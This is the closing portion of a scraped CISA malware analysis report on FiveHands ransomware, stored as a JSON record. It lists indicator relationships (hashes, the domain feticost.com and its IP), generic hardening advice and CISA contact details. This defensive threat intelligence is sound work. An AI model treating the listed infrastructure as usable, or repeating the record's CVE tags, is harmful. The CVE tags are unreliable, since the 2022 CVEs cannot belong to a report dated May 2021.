1dbb49f...\nUsed\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e\n\n\nc5a1dbb49f...\nUsed\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291\n\n\na7f5097c0d...\nRelated_To\n911a88fe16efca24206f1786242615596e67a9336bc670c1e44a33727987d886\n\n\na7f5097c0d...\nRelated_To\nc0a214a60daac6f0ba01ce9128d42bb2d8e81909f4b87963de340ab8627a6b0b\n\n\n911a88fe16...\nRelated_To\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa\n\n\nc0a214a60d...\nRelated_To\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa\n\n\nbfc50bf40a...\nConnected_To\nfeticost.com\n\n\nbfc50bf40a...\nUsed_By\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd\n\n\nfeticost.com\nConnected_From\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e\n\n\nfeticost.com\nResolved_To\n51.89.50.152\n\n\n51.89.50.152\nResolved_To\nfeticost.com\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Central.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nMay 6, 2021: Initial Version\n",
  "cves": [
    "CVE-2022-42475",
    "CVE-2022-47966"
  ],
  "techniques": [],
  "advisory": "ar21-126b",
  "title": "MAR-10324784-1.v1: FiveHands Ransomware | CISA",
  "source": "analysis-reports",
  "id": "4454eb047b8f9819654a56bcdbb79a1293aa63cbdb549889fae72fef82d3a891"
}